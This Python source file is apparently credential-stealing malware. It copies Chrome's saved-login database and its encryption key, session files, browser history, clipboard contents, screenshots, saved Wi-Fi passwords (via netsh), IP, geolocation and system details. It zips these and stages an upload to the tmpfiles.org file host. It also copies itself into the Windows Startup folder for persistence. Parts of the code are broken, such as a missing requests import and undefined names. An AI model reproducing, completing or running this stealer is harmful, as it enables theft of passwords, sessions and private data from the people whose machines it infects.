########
#AUTHOR : District
#######
from mss import mss
from requests import get
import shutil
import sys
import os
import browserhistory as bh
import subprocess
import pyperclip
import zipfile

#V.1.2.3
class Sp:
    def __init__(self, t):
        self.t = t
        self.c = 0
        self.file = []

    def evasion(self): ###evasion is not done yet
        r = requests.post(url="https://tmpfiles.org/api/v1/upload", data="file=/meme2.png")
        response = r.text
        print("url %s" % response )
        os.remove("windows.zip")
        #password()

    c_locate_folder = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
    p_locate_folder = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Login Data"%(os.environ['USERPROFILE']))
    destination_folder = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data \Default \Cache"%(os.environ['USERPROFILE']))
    path1 = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Sessions" % os.environ['USERPROFILE'])
    path2 = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Default\Network" % os.environ['USERPROFILE'])

    auto_run_path = os.path.normpath(r"%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"%(os.environ['USERPROFILE']))

    def auto_run(self):
        shutil.move("megaloptera.py", auto_run_path)
        self.password()


    def convert_file(self):
        print("self.file", self.file)
        files = zipfile.ZipFile('windows.zip', 'w')
        for i in range(len(self.file)):

            files.write(self.file[i])
            os.remove(self.file[i])
        files.close()
        #evasion()


    def sessions(self, pathS):
        print("launching sessions")
        self.c +=1
        print(self.c)
        try:
            print(pathS)
            with open("session.txt", 'a', errors="ignore") as sessionTxt:
                for root, dirs, files in os.walk(pathS):
                    for filename in files:
                        try:
                            with open(os.path.join(root, filename), "r", errors="ignore") as fileSessions:                            
                                file_data = fileSessions.read()
                                sessionTxt.write(file_data)            
                                if "session.txt" not in self.file:
                                    self.file.append("session.txt")
                
                        except Exception as e:
                            print(f"Error reading file: {os.path.join(root, filename)} - {e}")
        except Exception as e:
            print(f"Error: {e}")
        if self.c >= 2:
            self.wifi_password()



    def ip(self):
        print("launching ip")
        try:
            ip = get(f'https://api.ipify.org/?format=json')
            os.system("ipconfig /all > output.txt")
            file_ip = open("test_ip.txt", "w", encoding='utf-8')
            file_ip.write(str(ip.json()))
            file_ip.close()
            self.file.append("output.txt")
            self.file.append("test_ip.txt")            
        except:
            pass
        self.screenshots()


    def webcam(self): ### not working anymore
        print("launching webcam")
        try:
            ec.capture(0,"frame", "outputImage.jpg")
            
        except:
            print("failed")
            pass
        #browser()

    def screenshots(self):
        print("launching password")
        try:
            output_file = 'screenshots.jpg'
            with mss() as sct:
                sct.shot( output=output_file)
            self.file.append("screenshots.jpg")
        except:
            
            pass
        self.browser()


    def password(self):
        print("launching password")
        try:
            try:
                with open(p_locate_folder,'r', encoding="utf8",  errors="ignore") as text:
                    crypt = text.read().rstrip('\n')
                    with open(r"password.txt", 'w',encoding="utf-8" ,errors="ignore") as f:
                        f.write(crypt)
                        text.close()
                        f.close()
                self.file.append("password.txt")

            except:
                pass

            try:
                with open(c_locate_folder, 'r') as file:
                    data = file.read().rstrip('\n')
                with open(r"crypt.txt","w" ,encoding = 'utf-8') as p:
                    p.write(data)
                    file.close()
                    p.close()
                self.file.append("crypt.txt")
                
            except:
                pass
        except:
            pass
        self.ip()

    def location(self):
        try:
            geoloc = get(f'http://ip-api.com/json')
            file = open('location.txt', 'w', encoding='utf-8')
            file.write(str(geoloc.json()))
            file.close()
            self.file.append("location.txt")
        except:
            pass
        self.convert_file()


    def wifi_password(self):
        with open('wifi-password.txt', 'a') as wifile:
            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
            profiles = [i.split(":")[1][1:-1] for i in data if "Profil Tous les utilisateurs" in i]

            for i in profiles:
                try:
                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
                    results = [b.split(":")[1][1:-1] for b in results if "Contenu de la cl" in b]
                    try:
                        value = str("{:<30}| {:<}".format(i, results[0]))
                        wifile.write(value)
                        wifile.write('\n')
                    except IndexError:
                        pass
                except subprocess.CalledProcessError:
                    pass
        self.file.append("wifi-password.txt")
        self.location()


    def clipboard(self):
        try:
            with open("paper.log", "a") as clipfile:
                text = pyperclip.paste()
                clipfile.write("last data copied: ", text)
        except:
            pass
        self.sessions(self.path1)
        self.sessions(self.path2)


    def computer_info(self):
        try:
            cmd = os.system("whoami > who.txt")
            cmd = os.system("systeminfo > sys.txt")
            cmd = os.system("netstat -a > net.txt")
            cmd = os.system("getmac > mac.txt")
            self.file.extend(["who.txt", "sys.txt", "net.txt", "mac.txt"])
        except:
            pass
        self.clipboard()

    def browser(self):
        try:
            browser_history = []
            bh_user = bh.get_username()
            db_path = bh.get_database_paths()
            hist = bh.get_browserhistory()
            browser_history.extend((bh_user, db_path, hist))
            with open( 'browser.txt', 'a') as browser_txt:
                browser_txt.write(str(browser_history))
            os.system("ipconfig/displaydns > dns.txt")
            self.file.append("dns.txt")

        except:
            print("error")

        self.computer_info()


l = Sp(30)
l.password()
